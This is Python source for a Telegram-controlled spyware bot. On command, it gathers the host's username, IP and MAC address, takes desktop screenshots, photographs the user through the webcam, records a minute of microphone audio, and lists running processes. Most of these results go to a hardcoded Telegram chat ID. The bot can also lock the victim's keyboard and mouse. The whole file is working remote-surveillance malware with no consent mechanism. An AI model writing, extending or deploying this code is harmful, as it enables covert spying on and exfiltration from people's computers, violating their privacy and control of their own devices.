import asyncio
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile
from aiogram import Router, Bot
from dotenv import load_dotenv
import getpass
import platform
import socket
from datetime import datetime
from uuid import getnode as get_mac
import psutil
import pyautogui
import pyaudio
import wave
from subprocess import Popen, PIPE
import cv2
import os
import keyboard

router = Router()
load_dotenv()
api_key = os.getenv("API_KEY")
bot = Bot(token=api_key)

autoname = "FILENAME.py"

path = os.path.dirname(os.path.realpath(__file__))
address = os.path.join(path, autoname)
pyautogui.FAILSAFE = False
unlock_event = asyncio.Event()

@router.message(Command('start'))
async def cmd_check(message: Message):
    await message.answer("Hello!\nTo find out all the bot's capabilities, type the command /help")

@router.message(Command('check'))
async def cmd_check(message: Message):
    await message.answer("System status: online")

@router.message(Command('help'))
async def cmd_help(message: Message):
    await message.answer(f'\nCommand List:\n/check - Checking System Status\n/info - System characteristics\n/screen - Desktop screenshot\n/audio - Record audio from a voice recorder for a minute\n/process - List of running processes\n/camera - Make a photo\n/lock - lock keyboard and mouse\n/unlock - unlock keyboard and mouse')

@router.message(Command('info'))
async def cmd_info(message: Message):
    start = datetime.now()
    name = getpass.getuser()
    ip = socket.gethostbyname(socket.gethostname())
    mac = get_mac()
    ost = platform.uname()

    zone = psutil.boot_time()
    time = datetime.fromtimestamp(zone)
    cpu = psutil.cpu_freq()
    ends = datetime.now()
    workspeed = format(ends - start)

    file = open("info.txt", "w")
    file.write(
        f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
    file.close()

    current_path = os.path.join(os.getcwd(), "info.txt")
    document = FSInputFile(current_path)
    await bot.send_document(chat_id=message.from_user.id, document=document)
    file.close()
    os.remove("info.txt")

@router.message(Command('screen'))
async def cmd_screen(message: Message):
    pyautogui.screenshot("screenshot.jpg")
    current_path = os.path.join(os.getcwd(), "screenshot.jpg")
    photo = FSInputFile(current_path)
    await bot.send_photo(chat_id=1297964385, photo=photo)
    os.remove("screenshot.jpg")

@router.message(Command('camera'))
async def cmd_camera(message: Message):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await message.answer("Error: Could not open webcam")
        exit()
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("captured_image.jpg", frame)
        current_path = os.path.join(os.getcwd(), "captured_image.jpg")
        photo = FSInputFile(current_path)
        await bot.send_photo(chat_id=1297964385, photo=photo)
        os.remove("captured_image.jpg")
    else:
        await message.answer("Failed to capture image")
    cap.release()
    cv2.destroyAllWindows()

@router.message(Command('audio'))
async def cmd_audio(message: Message):
    chunk = 1024
    formats = pyaudio.paInt16
    channels = 1
    rate = 44100
    second = 60     # SECONDS
    names = "sound.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=formats,
                    channels=channels,
                    rate=rate,
                    input=True,
                    frames_per_buffer=chunk)
    print("")

    frames = []

    for i in range(0, int(rate / chunk * second)):
        data = stream.read(chunk)
        frames.append(data)

    print("")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(names, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(formats))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))

    current_path = os.path.join(os.getcwd(), "sound.wav")
    audio = FSInputFile(current_path)

    await bot.send_audio(chat_id=1297964385, audio=audio)
    wf.close()
    os.remove(names)

@router.message(Command('process'))
async def cmd_process(message: Message):
    process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
    ride = open("process.txt", "w", encoding="utf-8")
    ride.write(' '.join(process))
    ride.close()
    current_path = os.path.join(os.getcwd(), "process.txt")
    current = FSInputFile(current_path)
    await bot.send_document(chat_id=1297964385, document=current)
    ride.close()
    os.remove("process.txt")

@router.message(Command('lock'))
async def cmd_lock(message: Message):
    unlock_event.clear()
    await message.answer("🔒 Locked! Mouse will move continuously until unlocked.")

    while not unlock_event.is_set():
        for i in range(150):
            keyboard.block_key(i)
        pyautogui.moveTo(0, 0, duration=0.1)
        await asyncio.sleep(0.1)

@router.message(Command('unlock'))
async def cmd_unlock(message: Message):
    unlock_event.set()
    await message.answer("🔓 Unlocked! Mouse will move continuously until unlocked.")